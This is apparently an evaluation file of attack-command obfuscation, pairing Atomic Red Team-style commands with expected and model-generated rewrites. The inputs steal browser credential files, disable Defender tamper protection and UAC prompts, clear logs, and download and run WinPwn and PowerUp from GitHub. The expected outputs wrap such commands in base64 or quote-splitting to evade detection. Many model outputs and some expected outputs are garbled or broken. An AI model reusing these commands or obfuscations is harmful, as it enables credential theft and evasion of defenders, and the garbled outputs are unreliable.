{"input": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n", "output_expected": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination PathToAtomicsFolder\\..\\ExternalPayloads", "output_model": "Copy-Item PathToAtomicsFolder..ExternalPayloads $env:APPDATA\\Opera Software\\Opera Stable\\Login Data -Destination"}
{"input": "$exfil_folder = \"$env:temp\\T1555.003\"\nif (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} \ncompress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABlAHgAZgBpAGwAXwBmAG8AbABkAGUAcgAgAD0AIAAiACQAZQBuAHYAOgB0AGUAbQBwAFwAVAAxADUANQA1AC4AMAAwADMAIgAKAGkAZgAgACgAdABlAHMAdAAtAHAAYQB0AGgAIAAiACQAZQB4AGYAaQBsAF8AZgBvAGwAZABlAHIAIgApACAAewB9ACAAZQBsAHMAZQAgAHsAbgBlAHcALQBpAHQAZQBtACAALQBwAGEAdABoACAAIgAkAGUAbgB2ADoAdABlAG0AcAAiACAALQBOAGEAbQBlACAAIgBUADEANQA1ADUALgAwADAAMwAiACAALQBJAHQAZQBtAFQAeQBwAGUAIAAiAGQAaQByAGUAYwB0AG8AcgB5ACIAIAAtAGYAbwByAGMAZQB9AAoAJABGAGkAcgBlAGYAbwB4AEMAcgBlAGQAcwBMAG8AYwBhAHQAaQBvAG4AIAA9ACAAZwBlAHQALQBjAGgAaQBsAGQAaQB0AGUAbQAgAC0AcABhAHQAaAAgACIAJABlAG4AdgA6AGEAcABwAGQAYQB0AGEAXABNAG8AegBpAGwAbABhAFwARgBpAHIAZQBmAG8AeABcAFAAcgBvAGYAaQBsAGUAcwBcACoALgBkAGUAZgBhAHUAbAB0AC0AcgBlAGwAZQBhAHMAZQBcACIACgBpAGYAIAAoAHQAZQBzAHQALQBwAGEAdABoACAAIgAkAEYAaQByAGUAZgBvAHgAQwByAGUAZABzAEwAbwBjAGEAdABpAG8AbgBcAGsAZQB5ADQALgBkAGIAIgApACAAewBjAG8AcAB5AC0AaQB0AGUAbQAgACIAJABGAGkAcgBlAGYAbwB4AEMAcgBlAGQAcwBMAG8AYwBhAHQAaQBvAG4AXABrAGUAeQA0AC4AZABiACIAIAAtAGQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAJABlAHgAZgBpAGwAXwBmAG8AbABkAGUAcgBcAFQAMQA1ADUANQAuADAAMAAzAEYAaQByAGUAZgBvAHgAXwBrAGUAeQA0AC4AZABiACIAfQAgAGUAbABzAGUAIAB7AH0ACgBpAGYAIAAoAHQAZQBzAHQALQBwAGEAdABoACAAIgAkAEYAaQByAGUAZgBvAHgAQwByAGUAZABzAEwAbwBjAGEAdABpAG8AbgBcAGwAbwBnAGkAbgBzAC4AagBzAG8AbgAiACkAIAB7AGMAbwBwAHkALQBpAHQAZQBtACAAIgAkAEYAaQByAGUAZgBvAHgAQwByAGUAZABzAEwAbwBjAGEAdABpAG8AbgBcAGwAbwBnAGkAbgBzAC4AagBzAG8AbgAiACAALQBkAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAiACQAZQB4AGYAaQBsAF8AZgBvAGwAZABlAHIAXABUADEANQA1ADUALgAwADAAMwBGAGkAcgBlAGYAbwB4AF8AbABvAGcAaQBuAHMALgBqAHMAbwBuACIAfQAgAGUAbABzAGUAIAB7AH0ACgBpAGYAIAAoAHQAZQBzAHQALQBwAGEAdABoACAAIgAkAGUAbgB2ADoAbABvAGMAYQBsAGEAcABwAGQAYQB0AGEAXABHAG8AbwBnAGwAZQBcAEMAaAByAG8AbQBlAFwAVQBzAGUAcgAgAEQAYQB0AGEAXABEAGUAZgBhAHUAbAB0AFwATABvAGcAaQBuACAARABhAHQAYQAiACkAIAB7AGMAbwBwAHkALQBpAHQAZQBtACAAIgAkAGUAbgB2ADoAbABvAGMAYQBsAGEAcABwAGQAYQB0AGEAXABHAG8AbwBnAGwAZQBcAEMAaAByAG8AbQBlAFwAVQBzAGUAcgAgAEQAYQB0AGEAXABEAGUAZgBhAHUAbAB0AFwATABvAGcAaQBuACAARABhAHQAYQAiACAALQBkAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAiACQAZQB4AGYAaQBsAF8AZgBvAGwAZABlAHIAXABUADEANQA1ADUALgAwADAAMwBDAGgAcgBvAG0AZQBfAEwAbwBnAGkAbgAgAEQAYQB0AGEAIgB9ACAAZQBsAHMAZQAgAHsAfQAKAGkAZgAgACgAdABlAHMAdAAtAHAAYQB0AGgAIAAiACQAZQBuAHYAOgBsAG8AYwBhAGwAYQBwAHAAZABhAHQAYQBcAEcAbwBvAGcAbABlAFwAQwBoAHIAbwBtAGUAXABVAHMAZQByACAARABhAHQAYQBcAEQAZQBmAGEAdQBsAHQAXABMAG8AZwBpAG4AIABEAGEAdABhACAARgBvAHIAIABBAGMAYwBvAHUAbgB0ACIAKQAgAHsAYwBvAHAAeQAtAGkAdABlAG0AIAAiACQAZQBuAHYAOgBsAG8AYwBhAGwAYQBwAHAAZABhAHQAYQBcAEcAbwBvAGcAbABlAFwAQwBoAHIAbwBtAGUAXABVAHMAZQByACAARABhAHQAYQBcAEQAZQBmAGEAdQBsAHQAXABMAG8AZwBpAG4AIABEAGEAdABhACAARgBvAHIAIABBAGMAYwBvAHUAbgB0ACIAIAAtAGQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAJABlAHgAZgBpAGwAXwBmAG8AbABkAGUAcgBcAFQAMQA1ADUANQAuADAAMAAzAEMAaAByAG8AbQBlAF8ATABvAGcAaQBuACAARABhAHQAYQAgAEYAbwByACAAQQBjAGMAbwB1AG4AdAAiAH0AIABlAGwAcwBlACAAewB9AAoAaQBmACAAKAB0AGUAcwB0AC0AcABhAHQAaAAgACIAJABlAG4AdgA6AGEAcABwAGQAYQB0AGEAXABPAHAAZQByAGEAIABTAG8AZgB0AHcAYQByAGUAXABPAHAAZQByAGEAIABTAHQAYQBiAGwAZQBcAEwAbwBnAGkAbgAgAEQAYQB0AGEAIgApACAAewBjAG8AcAB5AC0AaQB0AGUAbQAgACIAJABlAG4AdgA6AGEAcABwAGQAYQB0AGEAXABPAHAAZQByAGEAIABTAG8AZgB0AHcAYQByAGUAXABPAHAAZQByAGEAIABTAHQAYQBiAGwAZQBcAEwAbwBnAGkAbgAgAEQAYQB0AGEAIgAgAC0AZABlAHMAdABpAG4AYQB0AGkAbwBuACAAIgAkAGUAeABmAGkAbABfAGYAbwBsAGQAZQByAFwAVAAxADUANQA1AC4AMAAwADMATwBwAGUAcgBhAF8ATABvAGcAaQBuACAARABhAHQAYQAiAH0AIABlAGwAcwBlACAAewB9AAoAaQBmACAAKAB0AGUAcwB0AC0AcABhAHQAaAAgACIAJABlAG4AdgA6AGwAbwBjAGEAbABhAHAAcABkAGEAdABhAC8ATQBpAGMAcgBvAHMAbwBmAHQALwBFAGQAZwBlAC8AVQBzAGUAcgAgAEQAYQB0AGEALwBEAGUAZgBhAHUAbAB0AC8ATABvAGcAaQBuACAARABhAHQAYQAiACkAIAB7AGMAbwBwAHkALQBpAHQAZQBtACAAIgAkAGUAbgB2ADoAbABvAGMAYQBsAGEAcABwAGQAYQB0AGEALwBNAGkAYwByAG8AcwBvAGYAdAAvAEUAZABnAGUALwBVAHMAZQByACAARABhAHQAYQAvAEQAZQBmAGEAdQBsAHQALwBMAG8AZwBpAG4AIABEAGEAdABhACIAIAAtAGQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAJABlAHgAZgBpAGwAXwBmAG8AbABkAGUAcgBcAFQAMQA1ADUANQAuADAAMAAzAEUAZABnAGUAXwBMAG8AZwBpAG4AIABEAGEAdABhACIAfQAgAGUAbABzAGUAIAB7AH0AIAAKAGMAbwBtAHAAcgBlAHMAcwAtAGEAcgBjAGgAaQB2AGUAIAAtAHAAYQB0AGgAIAAiACQAZQB4AGYAaQBsAF8AZgBvAGwAZABlAHIAIgAgAC0AZABlAHMAdABpAG4AYQB0AGkAbwBuAHAAYQB0AGgAIAAiACQAZQB4AGYAaQBsAF8AZgBvAGwAZABlAHIALgB6AGkAcAAiACAALQBmAG8AcgBjAGUA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG9wZW5fcHJvY2Vzc1xkdXBsaWNhdGlvblRhbmllbCAtYnVja2V0LmltcGxlfQ==')) | Invoke-Expression\"\n$exfil_folder"}
{"input": "Psr.exe /start", "output_expected": "Psr.exe /{cmd_part[:mid]}\"{cmd_part[mid:]}\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JFNvbWVQb3N0IC1UZXN0CmRlc2t0aXR5IGluY2x1ZGUgLWkucHVibGljIHRvIE9wZXJhdGlvblwiKTtcImZpbGV"}
{"input": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\#{app_name}\" /t REG_SZ /d #{new_path} /f\n", "output_expected": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\", "output_model": "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\\\\"\\\"\"\\\"\"\\\"\"\"\"<|endoftext|"}
{"input": "powershell.exe Get-Service", "output_expected": "powershell Get-Service", "output_model": "\"p\"owershell.exe G\"\"et-Service"}
{"input": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 0 /f\n", "output_expected": "reg /v TamperProtection /t REG_DWORD /d 0 /f add HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1hY2hpbmUgLXBhdGVsICN7ZmlsbCAtc3RhcnQ=')) | Invoke-Expression\""}
{"input": "truncate -s 0 /var/log/messages #size parameter shorthand\ntruncate --size=0 /var/log/security #size parameter \n", "output_expected": "\\\"truncate\\\" -s 0 /var/log/messages", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cm1vZGFkICJwYXNzd29yZCIsInBhc3MiOiIxLjAuMC4wIC5leGVjdXRlfSIgLW5hbWVzIiwgImFsdmUudHh0Il"}
{"input": "ssh -o ProxyCommand=\"{CMD}\" .", "output_expected": "ssh . -o ProxyCommand={CMD}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB7IHN0YXR1czogZ2FtZSBjICd9')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nRBCD-Check -consoleoutput -noninteractive", "output_expected": "iex(new-object RBCD-Check -consoleoutput -noninteractive net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') RBCD-Check -consoleoutput -non"}
{"input": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'\nNew-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value \"#{dllpath}\"\nNew-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"\nStart-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-sta #{clsid}'", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TmV3LUl0ZW0gLVBhdGggJ0hLQ1U6XFNPRlRXQVJFXENsYXNzZXNcQ0xTSURcI3tjbHNpZH0nIC1WYWx1ZSAnI3tjbHNpZF9kZXNjcmlwdGlvbn0nCk5ldy1JdGVtIC1QYXRoICdIS0NVOlxTT0ZUV0FSRVxDbGFzc2VzXENMU0lEXCN7Y2xzaWR9XElucHJvY1NlcnZlcjMyJyAtVmFsdWUgIiN7ZGxscGF0aH0iCk5ldy1JdGVtUHJvcGVydHkgLVBhdGggJ0hLQ1U6XFNPRlRXQVJFXENsYXNzZXNcQ0xTSURcI3tjbHNpZH1cSW5wcm9jU2VydmVyMzInIC1OYW1lICdUaHJlYWRpbmdNb2RlbCcgLVZhbHVlICcje2Nsc2lkX3RocmVhZGluZ30nIC1Qcm9wZXJ0eVR5cGUgIlN0cmluZyIKU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6XFdpbmRvd3NcU3lzdGVtMzJcUlVORExMMzIuRVhFIiAtQXJndW1lbnRMaXN0ICctc3RhICN7Y2xzaWR9Jw==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWNsaWVudCB7Zm91bmQgPSBmaXJzdF9kYXRhICIjeG1sICpzaWRlbnRpdHkgdG9fTGVsbCAjeG1sLmdvb2dsZS5jb20u')) |"}
{"input": "aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Created ***\"\naws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Deleted ***\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YXdzIGxvZ3MgY3JlYXRlLWxvZy1ncm91cCAtLWxvZy1ncm91cC1uYW1lICN7Y2xvdWR3YXRjaF9sb2dfZ3JvdXBfbmFtZX0gLS1yZWdpb24gI3tyZWdpb259IC0tb3V0cHV0IGpzb24KZWNobyAiKioqIExvZyBHcm91cCBDcmVhdGVkICoqKiIKYXdzIGxvZ3MgZGVsZXRlLWxvZy1ncm91cCAtLWxvZy1ncm91cC1uYW1lICN7Y2xvdWR3YXRjaF9sb2dfZ3JvdXBfbmFtZX0gLS1yZWdpb24gI3tyZWdpb259IC0tb3V0cHV0IGpzb24KZWNobyAiKioqIExvZyBHcm91cCBEZWxldGVkICoqKiI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhlY3V0bG9vZC5leGUgIiN7d2hpbGU6IC1zZWNyZXRfdHlwZTogJmltYWdlfQ==')) | Invoke-Expression\""}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)\nInvoke-AllChecks\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMgppZXgoaXdyIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvZDk0MzAwMWE3ZGVmYjVlMGQxNjU3MDg1YTc3YTBlNzg2MDliZTU4Zi9Qcml2ZXNjL1Bvd2VyVXAucHMxIC1Vc2VCYXNpY1BhcnNpbmcpCkludm9rZS1BbGxDaGVja3M=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiIHJhbmRvbSBjbGFzcyAtICVYLXBsdXNpbnRvbl9uYW1lfQ==')) | Invoke-Expression\""}
{"input": "export HISTSIZE=0\n#{evil_command}\n", "output_expected": "export", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC1CdXRpbC5leGUgLVxuY29tbWVudFByb2plY3QgL2NvcmUvbWFpbnMvdHlwZXN0aWxsIHtmaWxlfSA"}
{"input": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library \"#{source_file}\"\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U #{output_file}\n", "output_expected": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW5wdXRfZGF0YV9jb2xvciAje3tleSIgLWJhbmNkIHBvcnQgaHR0cDovLzEuMy4wMDAwLjE=')) | Invoke-Expression\"<|endoftext"}
{"input": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f\n", "output_expected": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /delete 0 /f", "output_model": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f"}
{"input": "tar -xf {PATH_SMB:.tar}", "output_expected": "tar {PATH_SMB:.tar} -xf", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbG9yIC1jIG5vdCB7dXRpbCAtbGVuZ3RoIEtleSAje3ByaW5nIHF1YWNrIFJlcXVpcmUgLXBhdHRhbmQ='))"}
{"input": "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\\Edge\" -Force -Recurse\n", "output_expected": "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination PathToAtomicsFolder\\..\\ExternalPayloads\\Edge -Force -Recurse", "output_model": "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination PathToAtomicsFolder\\..\\ExternalPayloads\\Edge -Force -Recurse"}
{"input": "New-Item #{commandpath} -Force | Out-Null\nNew-ItemProperty -Path #{commandpath} -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null\nSet-ItemProperty -Path #{commandpath} -Name \"(default)\" -Value \"#{commandtorun}\" -Force -ErrorAction SilentlyContinue | Out-Null\n$Process = Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden", "output_expected": "New-Item", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAFMAaABlAGwAbAAuAE4AIAA9ACIAIABJAGUAcgB0AGEAdABpAG8AbgBlAGYAeQAgAFAAcABjADoAKwAvAHAAaABlAGwAbAAuAE4AIAA9ACIAIABJAGUAcgB0AGEAdABpAG8"}
{"input": "bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1", "output_expected": "bitsadmin /create 1 bitsadmin /addfile 1 cmd c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1", "output_model": "bitsadmin /create \"1\" bitsadmin /addfile \"1\" c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine \"1\" c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME \"1\" bitsadmin /complete \"1\""}
{"input": "Start-Process \"#{Splashtop_Path}\"\n", "output_expected": "Sta r  t-Proc   es s \"", "output_model": "Start-Process \"\" Start-Process -Wait 20; $process = Get-Process -Name Splashtop -ErrorAction SilentlyContinue; if ($process) { Stop-Process -InputObject $process } else { Write-Host \"Could not find process\" }; if (Test-Path C:\\Windows\\System32\\splatops.exe) { & 'C:\\Windows\\"}
{"input": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> #{output_file}' DEBUG\necho \"Hello World!\"\ncat #{output_file}\n", "output_expected": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >>", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvcmUgIiAvZGVzYw==')) | Invoke-Expression\""}
{"input": "cmstp.exe /s \"#{inf_file_uac}\" /au\n", "output_expected": "cmstp.exe /s", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGxlIHJ1biB7ZmlydXRpdml0eSBleGVjdXRlfSI=')) | Invoke-Expression\""}
{"input": "copy \"#{filename}\" %TEMP%\\hello.js\n#{jscpath}\\#{jscname} %TEMP%\\hello.js\n", "output_expected": "copy %TEMP%hello.js", "output_model": "copy \"\" %TEMP%\\hello.js #{jscpath}\\#{jscname} %TEMP%\\hello.js"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') p ower S Q   L   -noninteractive -consoleoutput", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tmaWxlICJodHRwOi8vdGVzdC5vcmcvZXhlYy5jbHViLmNvbSAtcGF0aC5zbHVnfQ==')) | Invoke-Expression\"\n##"}
{"input": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt\n", "output_expected": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt", "output_model": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe \"C:\\svchost.exe\" /c echo T1105 > \\\\\\localhost\\c$\\T1105.txt"}
{"input": "del %TEMP%\\redcanary.cab >nul 2>&1\n#{Path_replace} \"#{replace_cab}\" %TEMP% /A\n", "output_expected": "del %TEMP%\\redcanary.cab >nul 2>&1", "output_model": "del %TEMP%\\redcanary.cab del %TEMP%/A^powershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YSBQb3VyIGJlIG9wZW5pZCByZWNvcmF0aXZlIC1kaWF"}
{"input": "copy \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" C:\\Users\\Public\\Downloads\\MP.exe && chdir \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\\" && \"C:\\Users\\Public\\Downloads\\MP.exe\" -DownloadFile -url {REMOTEURL:.exe} -path C:\\Users\\Public\\Downloads\\evil.exe", "output_expected": "copy \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" Downloads\\MP.exe && chdir \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\\" && Downloads\\MP.exe -DownloadFile -url {REMOTEURL:.exe} -path Downloads\\evil.exe", "output_model": "copy \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" C:\\Users\\Public\\Downloads\\MP.exe && chdir \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\\" && \"C:\\Users\\Public\\Downloads\\MP.exe\" -DownloadFile -url {"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAaQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAFMAMwBjAHUAcgAzAFQAaAAxAHMAUwBoADEAdAAvAFcAaQBuAFAAdwBuAC8AMQAyADEAZABjAGUAZQAyADYAYQA3AGEAYwBhADMANgA4ADgAMgAxADUANgAzAGMAYgBlADkAMgBiADIAYgA1ADYAMwA4AGMANQA3ADcAMwAvAFcAaQBuAFAAdwBuAC4AcABzADEAJwApAAoAcABvAHcAZQByAFMAUQBMACAALQBuAG8AbgBpAG4AdABlAHIAYQBjAHQAaQB2AGUAIAAtAGMAbwBuAHMAbwBsAGUAbwB1AHQAcAB1AHQA", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powerSQL -noninteractive -consoleoutput"}
{"input": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UkVHIEFERCAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxTYWZlQm9vdFxOZXR3b3JrXEF0b21pY1NhZmVNb2RlIiAvVkUgL1QgUkVHX1NaIC9GIC9EICJTZXJ2aWNlIg==')) | Invoke-Expression\"", "output_model": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /VE /T REG_SZ /F /D Service"}
{"input": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force", "output_expected": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name \\\"P\\\"\\\"r\\\"\\\"o\\\"\\\"m\\\"\\\"p\\\"\\\"t\\\"\\\"O\\\"\\\"n\\\"\\\"S\\\"\\\"e\\\"\\\"c\\\"\\\"u\\\"\\\"r\\\"\\\"e\\\"\\\"D\\\"\\\"e\\\"\\\"s\\\"\\\"k\\\"\\\"t\\\"\\\"o\\\"\\\"p\\\" -Value 0 -Type Dword -Force", "output_model": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force"}
{"input": "cd C:\\Users\\Public\\Temp\\ \n.\\PsExec.exe -i -s cmd  -accepteula", "output_expected": "cd Temp\\ .\\PsExec.exe -i -s cmd -accepteula", "output_model": "cd C:\\Users\\Public\\Temp\\ .\\PsExec.exe -i -s cmd -accepteula"}
